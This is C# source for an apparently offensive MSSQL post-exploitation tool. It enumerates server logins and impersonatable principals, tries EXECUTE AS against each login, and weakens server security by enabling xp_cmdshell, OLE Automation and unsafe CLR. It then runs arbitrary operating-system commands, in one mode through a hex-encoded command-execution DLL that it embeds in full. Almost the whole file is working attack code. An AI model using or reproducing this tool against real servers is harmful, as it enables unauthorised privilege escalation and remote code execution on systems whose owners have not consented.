using System;
using System.Collections.Generic;
using System.Data.SqlClient;

// Execute arbitrary code or queries on remote SQL servers via xp_cmdshell, sp_OACreate, and a custom assembly
// Usage:
//xp_cmdshell
//sqlExec.exe -h <target host> -e 1 -d <database> -l sa -c "<command>"

//sp_OACreate
//sqlExec.exe -h <target host> -e 2 -d<database> -c "<command>"

//Custom Assembly
//sqlExec.exe -h <target host> -e 3 -u dbo -d msdb` -c "<command>" 

//Custom Query
//sqlExec.exe -h <target host> -u dbo -d msdb` -q "<query>"

//Attempt to enumerate all available logins
//sqlExec.exe -h <target host> -la -q "select DB_NAME();"


namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "";
            String database = "master";
            String cmd = "whoami";
            String execType = "";
            String login = "";
            String user = "";
            String customQuery = "";
            bool verbose = false;
            bool loginAll = false;

            for (var i = 0; i < args.Length; i++)
            {
                if (args[i] == "-h") { sqlServer = args[i + 1]; }
                else if (args[i] == "-d") { database = args[i + 1]; }
                else if (args[i] == "-c") { cmd = args[i + 1]; }
                else if (args[i] == "-e") { execType = args[i + 1]; }
                else if (args[i] == "-l") { login = args[i + 1]; }
                else if (args[i] == "-la") { loginAll = true; }
                else if (args[i] == "-u") { user = args[i + 1]; }
                else if (args[i] == "-q") { customQuery = args[i + 1]; }
                else if (args[i] == "-v") { verbose = true; }
            }

            if (sqlServer == "")
            {
                Console.WriteLine("Please specify a host with -h <host>");
                Environment.Exit(0);
            }

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            SqlCommand command = new SqlCommand("SELECT SYSTEM_USER;", con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            if (login != "")
            {
                String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
                command = new SqlCommand(querysysadminrole, con);
                reader = command.ExecuteReader();
                reader.Read();
                Int32 sysadminrole = Int32.Parse(reader[0].ToString());
                if (sysadminrole == 1)
                {
                    Console.WriteLine(user + " is a member of sysadmin role");
                }
                else
                {
                    Console.WriteLine(user + " is NOT a member of sysadmin role. Note that all linked SQL servers may not be displayed!");
                }
                reader.Close();
                Console.WriteLine("");
                string queryusers = "select * from master.sys.server_principals;";
                command = new SqlCommand(queryusers, con);
                reader = command.ExecuteReader();
                Console.WriteLine("SQL users found:");
                while (reader.Read())
                {
                    Console.WriteLine(reader[0]);
                }
                reader.Close();
                Console.WriteLine("");
                String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
                command = new SqlCommand(query, con);
                reader = command.ExecuteReader();
                Console.WriteLine("Logins that can be impersonated (Remember to check dbo): ");
                while (reader.Read() == true)
                {
                    Console.WriteLine(reader[0]);
                }
                reader.Close();

                String querylogin = "SELECT SYSTEM_USER;";
                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();

                reader.Read();
                Console.WriteLine("Before Impersonation, logged in as: " + reader[0]);
                reader.Close();

                String executeas = "EXECUTE AS LOGIN = '" + login + "';";
                try
                {
                    command = new SqlCommand(executeas, con);
                    reader = command.ExecuteReader();
                }
                catch (SqlException sqlEx)
                {
                    Console.WriteLine("Error impersonating login " + login+" Use -v for error info");
                    if (verbose)
                    {
                        Console.WriteLine("Error impersonating login " + login + ":");
                        Console.WriteLine(sqlEx.Message);
                    }
                }
                reader.Close();

                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();

                reader.Read();
                Console.WriteLine("After Impersonation, logged in as: " + reader[0]);
                reader.Close();
            }

            if (loginAll)
            {
                String querylogin = "SELECT SYSTEM_USER;";
                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();

                reader.Read();
                String username = (string)reader[0];
                reader.Close();

                String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
                command = new SqlCommand(querysysadminrole, con);
                reader = command.ExecuteReader();
                reader.Read();
                Int32 sysadminrole = Int32.Parse(reader[0].ToString());
                if (sysadminrole == 1)
                {
                    Console.WriteLine(username +" is a member of sysadmin role");
                }
                else
                {
                    Console.WriteLine(username+" is NOT a member of sysadmin role. Note that all linked SQL servers may not be displayed!");
                }
                reader.Close();
                Console.WriteLine("");
                string queryusers = "select * from master.sys.server_principals;";
                command = new SqlCommand(queryusers, con);
                reader = command.ExecuteReader();
                Console.WriteLine("SQL users found:");
                List<String> logins = new List<String>();
                while (reader.Read())
                {
                    Console.WriteLine(reader[0]);
                    logins.Add((string)reader[0]);
                }
                reader.Close();
                Console.WriteLine("");
                String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
                command = new SqlCommand(query, con);
                reader = command.ExecuteReader();
                Console.WriteLine("Logins that can be impersonated (Remember to check dbo): ");

                
                while (reader.Read() == true)
                {
                    Console.WriteLine(reader[0]);

                }
                reader.Close();

                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();

                reader.Read();
                Console.WriteLine("Before Impersonation, logged in as: " + reader[0]);
                reader.Close();

                for (int i = 0; i < logins.Count; i++)
                {
                    Console.WriteLine("\nAttempting to impersonate login " + logins[i]);
                    String executeas = "EXECUTE AS LOGIN = '" + logins[i] + "';";
                    try
                    {
                        command = new SqlCommand(executeas, con);
                        reader = command.ExecuteReader();
                        reader.Close();

                        command = new SqlCommand(querylogin, con);
                        reader = command.ExecuteReader();

                        reader.Read();
                        Console.WriteLine("After Impersonation, logged in as: " + reader[0]);
                        reader.Close();

                    }
                    catch (SqlException sqlEx)
                    {
                        Console.WriteLine("Error impersonating login " + login + " Use -v for error info");
                        if (verbose)
                        {
                            Console.WriteLine("Error impersonating login " + login + ":");
                            Console.WriteLine(sqlEx.Message);
                            reader.Close();
                        }
                    }
                }
            }

            else if (user != "")
            {
                Console.WriteLine("Attempting user-based impersonation");
                String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
                command = new SqlCommand(querysysadminrole, con);
                reader = command.ExecuteReader();
                reader.Read();
                Int32 sysadminrole = Int32.Parse(reader[0].ToString());
                if (sysadminrole == 1)
                {
                    Console.WriteLine(user + " is a member of sysadmin role");
                }
                else
                {
                    Console.WriteLine(user + " is NOT a member of sysadmin role. Note that all linked SQL servers may not be displayed!");
                }
                reader.Close();
                Console.WriteLine("");
                string queryusers = "select * from master.sys.server_principals;";
                command = new SqlCommand(queryusers, con);
                reader = command.ExecuteReader();
                Console.WriteLine("SQL users found:");
                while (reader.Read())
                {
                    Console.WriteLine(reader[0]);
                }
                reader.Close();
                Console.WriteLine("");
                String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
                command = new SqlCommand(query, con);
                reader = command.ExecuteReader();
                Console.WriteLine("Logins that can be impersonated (Remember to check /i:dbo!): ");
                while (reader.Read() == true)
                {
                    Console.WriteLine(reader[0]);
                }
                reader.Close();

                String querylogin = "SELECT USER_NAME();";
                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();

                reader.Read();
                Console.WriteLine("Before Impersonation, logged in as: " + reader[0]);
                reader.Close();

                String executeas = "EXECUTE AS USER = '" + user + "';";


                try
                {
                    command = new SqlCommand(executeas, con);
                    reader = command.ExecuteReader();
                }
                catch (SqlException sqlEx)
                {
                    Console.WriteLine("Error impersonating user " + user + " Use -v for error info");
                    if (verbose)
                    {
                        Console.WriteLine("Error impersonating login " + user + ":");
                        Console.WriteLine(sqlEx.Message);
                    }
                }

                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();

                reader.Read();
                Console.WriteLine("After Impersonation, logged in as: " + reader[0]);
                reader.Close();
            }

            else
            {
                Console.WriteLine("Executing without impersonation - use either -u for username impersonation or -l for login impersonation");
            }

            if (execType == "1")
            {
                String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                String execCmd = "EXEC xp_cmdshell " + cmd;

                command = new SqlCommand(enable_xpcmd, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(execCmd, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Result of command is: ");
                Console.WriteLine(reader[0]);
                if (reader.HasRows)
                {
                    int count = reader.FieldCount;
                    while (reader.Read())
                    {

                        for (int i = 0; i < count; i++)
                        {
                            Console.WriteLine(reader.GetValue(i));
                        }
                    }
                }
                reader.Close();
            }

            else if (execType == "2")
            {
                String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"" + cmd + "';";

                command = new SqlCommand(enable_ole, con);
                reader = command.ExecuteReader();
                reader.Close();

                command = new SqlCommand(execCmd, con);
                reader = command.ExecuteReader();
                reader.Close();
                Console.WriteLine("Executed " + cmd);
                Console.WriteLine("Note: sp_OACreate method does not return console output");
            }

            else if (execType == "3")
            {
                String disable_clr = "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'clr enabled',1;RECONFIGURE;EXEC sp_configure 'clr strict security', 0;RECONFIGURE;";
                command = new SqlCommand(disable_clr, con);
                reader = command.ExecuteReader();
                reader.Close();

                String drop_proc = "DROP PROCEDURE IF EXISTS [dbo].[cmdExec];";
                command = new SqlCommand(drop_proc, con);
                reader = command.ExecuteReader();
                reader.Close();

                String create_assembly = "DROP ASSEMBLY IF EXISTS myAssembly; CREATE ASSEMBLY myAssembly FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000005045000064860200B49EA3E90000000000000000F00022200B023000000C00000004000000000000000000000020000000000080010000000020000000020000040000000000000006000000000000000060000000020000000000000300608500004000000000000040000000000000000010000000000000200000000000000000000010000000000000000000000000000000000000000040000098030000000000000000000000000000000000000000000000000000FC290000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E74657874000000A30A000000200000000C000000020000000000000000000000000000200000602E72737263000000980300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000E8080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E0000240300000804000023537472696E6773000000002C070000580000002355530084070000100000002347554944000000940700005401000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F0000000100000001000000030000000000720201000000000006009C0127030600090227030600BA00F5020F00470300000600E2008B0206007F018B02060060018B020600F0018B020600BC018B020600D5018B0206000F018B020600CE0008030600AC000803060043018B0206002A013B020600990384020A00F900D4020A00550256030E007C03F5020A007000D4020E00AB02F50206006B0284020A002000D4020A009C0014000A00EB03D4020A009400D4020600BC020A000600C9020A000000000001000000000001000100010010006B03000041000100010048200000000096004300620001000921000000008618EF02060002000000010064000900EF0201001100EF0206001900EF020A002900EF0210003100EF0210003900EF0210004100EF0210004900EF0210005100EF0210005900EF0210006100EF0215006900EF0210007100EF0210007900EF0210008900EF0206009900EF02060099009D022100A9007E001000B10092032600A90084031000A90027021500A900D00315009900B7032C00B900EF023000A100EF023800C9008B003F00D100AC0344009900BD034A00E1004B004F0081005F024F00A10068025300D100F6034400D100550006009900A00306009900A60006008100EF02060020007B004F012E000B0068002E00130071002E001B0090002E00230099002E002B00AC002E003300AC002E003B00AC002E00430099002E004B00B2002E005300AC002E005B00AC002E006300CA002E006B00F4002E00730001011A000480000001000000000000000000000000003500000004000000000000000000000059002C0000000000040000000000000000000000590014000000000004000000000000000000000059008402000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200686F73746564434D444578656300636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E6700686F73746564434D44457865632E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F7700000000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F00750074007000750074000000193E466BCA8DC94DA09CA264E2D0F13700042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000001201000D686F73746564434D4445786563000005010000000017010012436F7079726967687420C2A920203230323300002901002434623865313235362D303334312D343161662D613639322D33323466663962386163333600000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E32040100000000000000D400078900000000020000006F000000342A0000340C000000000000000000000000000010000000000000000000000000000000525344532BEACB322A54BC42BEE5FB612EFE7E39010000005C5C3139322E3136382E34392E36345C76697375616C73747564696F5C4D5353514C456E756D5C686F73746564434D44457865635C6F626A5C7836345C52656C656173655C686F73746564434D44457865632E7064620000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000003C03000000000000000000003C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0049C020000010053007400720069006E006700460069006C00650049006E0066006F0000007802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D006500000000000000000044000E000100460069006C0065004400650073006300720069007000740069006F006E000000000068006F00730074006500640043004D00440045007800650063000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000044001200010049006E007400650072006E0061006C004E0061006D006500000068006F00730074006500640043004D00440045007800650063002E0064006C006C0000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200330000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000004C00120001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000068006F00730074006500640043004D00440045007800650063002E0064006C006C0000003C000E000100500072006F0064007500630074004E0061006D0065000000000068006F00730074006500640043004D00440045007800650063000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;";
                command = new SqlCommand(create_assembly, con);
                reader = command.ExecuteReader();
                reader.Close();

                String create_proc = "CREATE PROCEDURE[dbo].[cmdExec] @execCommand NVARCHAR(4000) AS EXTERNAL NAME[myAssembly].[StoredProcedures].[cmdExec];";
                command = new SqlCommand(create_proc, con);
                reader = command.ExecuteReader();
                reader.Close();

                String execCmd = "EXEC cmdExec " + cmd;
                command = new SqlCommand(execCmd, con);

                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Result of command is: ");
                Console.WriteLine(reader[0]);
                if (reader.HasRows)
                {
                    int count = reader.FieldCount;
                    while (reader.Read())
                    {

                        for (int i = 0; i < count; i++)
                        {
                            Console.WriteLine(reader.GetValue(i));
                        }
                    }
                }
                reader.Close();
            }

            else
            {
                if (customQuery == "")
                {
                    Console.WriteLine("Please specify an exec type with -e (either '1' for xp_cmdshell or '2' for sp_OACreate)");
                    Environment.Exit(0);
                }
                else
                {
                    command = new SqlCommand(customQuery, con);

                    reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("Result of command is: ");
                    Console.WriteLine(reader[0]);
                    if (reader.HasRows)
                    {
                        int count = reader.FieldCount;
                        while (reader.Read())
                        {

                            for (int i = 0; i < count; i++)
                            {
                                Console.WriteLine(reader.GetValue(i));
                            }
                        }
                    }
                    reader.Close();
                }
            }

            con.Close();
        }
    }
}
